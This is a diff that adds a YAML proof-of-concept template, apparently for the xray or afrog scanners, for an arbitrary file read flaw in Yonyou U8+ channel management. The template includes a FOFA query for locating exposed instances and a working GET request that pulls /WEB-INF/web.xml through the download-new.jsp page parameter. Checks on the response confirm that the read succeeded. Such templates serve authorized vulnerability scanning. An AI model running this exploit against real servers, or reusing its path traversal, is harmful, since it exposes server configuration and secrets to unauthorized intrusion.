@@ -1,0 +1,19 @@
+id: poc-yaml-yongyon-u8-cm-ae-download-new-anyfile-read
+info:
+  name: 用友U8+渠道管理(高级版) download-new 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友U8+渠道管理(高级版)
+  fofa: body="用友U8CRM"
+requests:
+- method: GET
+  path: /indexbusiness.jsp
+  expression: status_code == 200 && contains(title,"渠道管理（高级版）")
+- method: GET
+  path: /business/common/download-new.jsp?filename=&page=/WEB-INF/web.xml
+  expression: "status_code == 200 && \ncontains(body,\"</web-app>\") &&\ncontains(body,\"\
+    <servlet-name>\") &&\ncontains(headers,\"filename=\") &&\ncontains(content_type,\"\
+    application/x-msdownload\")\n"
+variables: {}
+transport: http
